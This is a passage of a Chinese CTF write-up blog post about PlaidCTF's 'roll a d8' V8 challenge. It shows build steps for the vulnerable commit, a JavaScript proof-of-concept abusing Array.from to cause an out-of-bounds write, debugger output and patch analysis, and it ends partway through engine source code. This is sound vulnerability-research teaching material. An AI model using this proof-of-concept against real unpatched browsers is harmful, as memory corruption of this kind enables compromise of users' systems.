<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PlaidCTF - roll a d8 | Migraine殇</title><meta name="keywords" content="仍在学习的苦旅中"><meta name="author" content="Migraine殇"><meta name="copyright" content="Migraine殇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="如何从一个commit获取diff和poc，最后写出一个v8的exploit。是这次需要解决的问题。">
<meta property="og:type" content="article">
<meta property="og:title" content="PlaidCTF - roll a d8">
<meta property="og:url" content="https://migraine-sudo.github.io/2020/02/22/roll-a-v8/index.html">
<meta property="og:site_name" content="Migraine殇">
<meta property="og:description" content="如何从一个commit获取diff和poc，最后写出一个v8的exploit。是这次需要解决的问题。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://migraine-sudo.github.io/img/tJBFnf.jpg">
<meta property="article:published_time" content="2020-02-22T10:50:51.000Z">
<meta property="article:modified_time" content="2023-08-14T03:22:32.832Z">
<meta property="article:author" content="Migraine殇">
<meta property="article:tag" content="Exploit">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://migraine-sudo.github.io/img/tJBFnf.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://migraine-sudo.github.io/2020/02/22/roll-a-v8/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><link rel="apple-touch-icon" sizes="180x180" href="/images/icons/icon-512x512.png"/><link rel="icon" type="image/png" sizes="32x32" href="/images/icons/icon-512x512.png"/><link rel="icon" type="image/png" sizes="16x16" href="/images/icons/icon-512x512.png"/><link rel="mask-icon" href="/images/icons/icon-512x512.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-08-14 11:22:32'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/%E6%88%88%E8%96%87.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/tJBFnf.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Migraine殇</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PlaidCTF - roll a d8</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-02-22T10:50:51.000Z" title="发表于 2020-02-22 18:50:51">2020-02-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-14T03:22:32.832Z" title="更新于 2023-08-14 11:22:32">2023-08-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/v8/">v8</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div class="note info flat"><p>本文首发于安全客自媒体，最终解释权归安全客所有。</p>
</div>

<div class="note primary modern"><p>阅读辅助：</p>
<p>IE相关漏洞：<a href="https://migraine-sudo.github.io/2019/12/21/Shellcode-Write/">Shellcode编写</a>-&gt;<a href="https://migraine-sudo.github.io/2019/11/07/%E6%B5%8F%E8%A7%88%E5%99%A8UAF/">IE的UAF分析</a>-&gt; <a href="https://migraine-sudo.github.io/2019/12/01/CVE-2012-1876/">IE堆溢出利用</a> </p>
<p>JS Engine相关：<a href="https://migraine-sudo.github.io/2020/02/15/v8/">V8基础</a>-&gt;<a href="https://migraine-sudo.github.io/2019/12/20/qwn2own/">jscore exloit</a>&gt;<a href="https://migraine-sudo.github.io/2020/02/22/roll-a-v8/">roll a d8</a>-&gt;<a href="https://migraine-sudo.github.io/2020/10/06/v8-Instrumentation/">对V8进行插桩</a></p>
<p>CTF相关漏洞：<a href="https://migraine-sudo.github.io/2019/11/22/how2heap1/">how2heap One</a>-&gt;<a href="https://migraine-sudo.github.io/2019/11/25/how2heap2/">how2heap Two</a>-&gt;<a href="https://migraine-sudo.github.io/2020/01/25/how2heap3/">how2heap Three</a>-&gt;<a href="https://migraine-sudo.github.io/2020/01/27/how2heap4/">how2heap Four</a></p>
</div>

<p>如何从一个commit获取diff和poc，最后写出一个v8的exploit。是这次需要解决的问题。</p>
<a id="more"></a>

<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p><strong>roll a d8</strong></p>
<p><a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/chromium/issues/detail?id=821137">题目链接</a></p>
<p>进入题目给出的网站，能够找到漏洞修复的信息。</p>
<ul>
<li>上个版本的hash值，以及diff文件</li>
<li>用于验证崩溃的poc文件</li>
</ul>
<p>我们能够通过hash值来回溯到之前到版本。使用poc来验证崩溃，不过该漏洞仅有DEBUG版会对该poc发生崩溃。同时我们也可以查看diff，根据补丁分析漏洞。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/4MjFie.png" alt="4MjFie"></p>
<p><strong>v8环境搭建</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">回溯版本到包含漏洞版本</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gclient sync</span></span><br><span class="line"><span class="meta">#</span><span class="bash">分别编译Debug和Release版本</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tools/dev/v8gen.py x64.debug</span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> ninja -C out.gn/x64.debug d8</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tools/dev/v8gen.py x64.release</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ninja -C out.gn/x64.release d8</span></span><br></pre></td></tr></table></figure>
<p><strong>diff</strong></p>
<p>查看和parent版本的diff文件</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/WK1vPc.png" alt="WK1vPc"></p>
<h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oobArray = [];								<span class="comment">//创建了一个oobArray数组对象</span></span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;						<span class="comment">//8244			</span></span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> ( <span class="comment">//实现了一个迭代器</span></span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    <span class="function"><span class="title">next</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="built_in">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">        oobArray.length = <span class="number">0</span>;											<span class="comment">//在迭代器中将oobArray.length置零</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"><span class="comment">//%DebugPrint(oobArray);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line">oobArray[oobArray.length - <span class="number">1</span>] = <span class="number">0x41414141</span>;				<span class="comment">//触发crash</span></span><br></pre></td></tr></table></figure>
<p><em>poc分析需要一定的JS基础，我已经把自己整理的一些基础写在文章后面了，和我一样0基础的读者可以先去看一下</em></p>
<p><strong>length置零</strong></p>
<p>JSArray数组置零是poc的关键部分，让我们看一下JSArray的length置零的效果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a&#x3D;[&#39;migraine&#39;,&#39;sudo&#39;];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">a.length&#x3D;0;</span><br><span class="line">%DebugPrint(a);</span><br></pre></td></tr></table></figure>
<p><em>置零之前</em></p>
<p>JSArray.length&#x3D;2，用于存储数据的FixedArray长度也为2。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x37fff628d4c1: [JSArray]</span><br><span class="line"> - map: 0x3d9424202729 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x111759e85539 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x37fff628d471 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS (COW)]</span><br><span class="line"> - length: 2  																										&lt;--JSArray.length&#x3D;2</span><br><span class="line"> - properties: 0x3ab30b882251 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3ab30b8cff89 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x37fff628d471 &lt;FixedArray[2]&gt; &#123;												&lt;--FixedArray.length&#x3D;2</span><br><span class="line">           0: 0x111759ea7021 &lt;String[8]: migraine&gt;</span><br><span class="line">           1: 0x111759ea7041 &lt;String[4]: sudo&gt;</span><br></pre></td></tr></table></figure>
<p><em>置零之后</em></p>
<p>JSArray的长度被置0，而FixedArray的空间也被释放。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x37fff628d4c1: [JSArray]</span><br><span class="line"> - map: 0x3d9424202729 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x111759e85539 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3ab30b882251 &lt;FixedArray[0]&gt; [PACKED_ELEMENTS]		&lt;--FixedArray Released...</span><br><span class="line"> - length: 0																									&lt;--JSArray.length&#x3D;0</span><br><span class="line"> - properties: 0x3ab30b882251 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3ab30b8cff89 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p><em>需要关注的点就是JSArray的length和FixedArray的length在正常操作下是保持同步的，而接下来的poc将打破这种同步关系</em></p>
<p><strong>触发DCHECK而造成Crash</strong></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/FJBCKY.png" alt="FJBCKY"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/WxcdyC.png" alt="WxcdyC"></p>
<p><em>DECHECK</em>检查index和this-&gt;length()的时候出现了一些问题，检查语句来自fixed-array-inl.h:96。</p>
<p>FixedArray::set中的this对象与oobArray的elements地址相符。但是这里的elememts指向的却是一个空数组。</p>
<p>我们注意到</p>
<ul>
<li>JSArray结构中的length&#x3D;8224</li>
<li>JSArray中的Elements和Property结构（分别指向FixedArray），却是一个空数组（length&#x3D;0）</li>
</ul>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/cWbkxi.png" alt="cWbkxi"></p>
<p>执行FixedArray::set方法，就是向对象的某个index位置写入value，在poc对应的调用语句就是*oobArray[oobArray.length - 1] &#x3D; 0x41414141;*。</p>
<p>FixedArray对象的this-&gt;length()&#x3D;0（因为this此时是指向Elements这个空数组），而index为8223（因为length&#x3D;8224）。</p>
<p>产生一个越界写。在release版本下是没有DEBUG CHECK的，所以能够造成任意地址写。同理，使用读取函数也能造成越界读。</p>
<p><em>越界读取</em>crash</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/PP1g0G.png" alt="PP1g0G"></p>
<h2 id="Patch分析"><a href="#Patch分析" class="headerlink" title="Patch分析"></a>Patch分析</h2><p>让我们来分析diff，找出导致JSArray的length值和实际存储空间不同的原因。根据上文中对poc的调试，应该是某个判读导致对JSArray的length值先被置零，而后却被改回原来的数据，产生一个越界读取。</p>
<p>源代码中代码包含很多<a target="_blank" rel="noopener" href="https://v8.dev/blog/csa">CodeStubAssembler</a>的内容。</p>
<blockquote>
<p><strong>CodeStubAssembler</strong>:为v8提供的高效的低级功能，非常接近汇编语言，同时保持platform-independent和可读性。定义在code-stub-assembler.h中。</p>
</blockquote>
<p>这部分参考大神的<a target="_blank" rel="noopener" href="https://hpasserby.top/post/abaa2e35.html#CodeStubAssembler%E7%AE%80%E4%BB%8B">总结</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">F_BUILTIN：创建一个函数</span><br><span class="line">Label：声明将要用到的标签名，这些标签名将作为跳转的目标</span><br><span class="line">BIND：绑定标签（相当于将一个代码块和一个标签名绑定，跳转时就可以使用标签名跳转到相应代码块）</span><br><span class="line">Branch：条件跳转指令</span><br><span class="line">VARIABLE：定义一些变量</span><br><span class="line">Goto：跳转</span><br><span class="line">CAST：类型转换</span><br><span class="line">CALLJS：调用给定的JS函数</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/re7Sag.png" alt="re7Sag"></p>
<p>根据patch，推断GotoIf的判断出现了问题。Path将SmiLessThan改成了SmiNotEqual，只要两者不相同就会运行&amp;runtime。所以我们判断，漏洞产生于当length_smi大于old_length的时候，并且没有发生Goto跳转的情况。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   TNode&lt;Smi&gt; length_smi = CAST(length);</span><br><span class="line">   TNode&lt;Smi&gt; old_length = LoadFastJSArrayLength(fast_array);</span><br><span class="line">...略</span><br><span class="line"><span class="comment">// 3) If the created array already has a length greater than required,</span></span><br><span class="line">   <span class="comment">//    then use the runtime to set the property as that will insert holes</span></span><br><span class="line">   <span class="comment">//    into the excess elements and/or shrink the backing store.</span></span><br><span class="line">   GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line">   StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,</span><br><span class="line">                                  length_smi); <span class="comment">//将length_smi赋值给JSArray的Length</span></span><br></pre></td></tr></table></figure>
<p>根据注释可以很容易地推断。</p>
<ul>
<li><p>运行&amp;runtime会根据length_smi初始化property数组，也就是根据length_smi大小分配正确空间</p>
</li>
<li><p>运行 <em>StoreObjectFieldNoWriteBarrier</em>会将JSArray的length修改为length_smi</p>
<p>如果length_smi小于old_length就会调用&amp;runtime实现内存缩减，而如果length_smi等于oldlength就会调用StoreObjectFieldNoWriteBarrier会将JSArray的length修改为length_smi</p>
<p>但如果length_smi&gt;old_length，那么就会导致JSArray.length比old_length实际存储,但是内存并没有被修改（对象FixedArray中的length不变），要大的情况，将会造成一个数组越界漏洞。</p>
</li>
</ul>
<p>当然，漏洞产生的原因已经清楚了，但是我们对漏洞还存在疑问–<em>为什么length_smi会大于old_length，以及这两个参数的本质</em>所以需要回溯到上层代码。调用该函数的代码并不多，而我们poc中调用了Array.from，所以比较好找，不过这段代码是比较长的，需要耐心看和分析。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/TeQk5L.png" alt="TeQk5L"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/2inbee.png" alt="2inbee"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/tMrZM5.png" alt="tMrZM5"></p>
<p>这部分代码是<em>Array.From</em>的*C++*实现（要看js实现可以看polyfill）,array.from的功能在下文中的JS基础中有介绍。在结尾调用了GenerateSetLength函数。</p>
<p><em><strong>ArrayFrom实现</strong></em></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES #sec-array.from</span></span><br><span class="line">TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) &#123; </span><br><span class="line">  TNode&lt;Context&gt; context = CAST(Parameter(BuiltinDescriptor::kContext));</span><br><span class="line">  TNode&lt;Int32T&gt; argc =</span><br><span class="line">      UncheckedCast&lt;Int32T&gt;(Parameter(BuiltinDescriptor::kArgumentsCount)); <span class="comment">//获取输入参数</span></span><br><span class="line"></span><br><span class="line">  <span class="function">CodeStubArguments <span class="title">args</span><span class="params">(<span class="keyword">this</span>, ChangeInt32ToIntPtr(argc))</span></span>;									<span class="comment">//将参数转化为指针</span></span><br><span class="line"></span><br><span class="line">  TNode&lt;Object&gt; map_function = args.GetOptionalArgumentValue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If map_function is not undefined, then ensure it&#x27;s callable else throw.</span></span><br><span class="line">  <span class="comment">//判断输入的map_function是否可以执行//实际上这部分和我们的poc关系不大</span></span><br><span class="line">  &#123;</span><br><span class="line">    Label no_error(this), error(this);</span><br><span class="line">    GotoIf(IsUndefined(map_function), &amp;no_error);													<span class="comment">//判断是否Undefined</span></span><br><span class="line">    GotoIf(TaggedIsSmi(map_function), &amp;error);														<span class="comment">//判断是否是Smi</span></span><br><span class="line">    Branch(IsCallable(map_function), &amp;no_error, &amp;error);									<span class="comment">//判断是否Callable</span></span><br><span class="line"></span><br><span 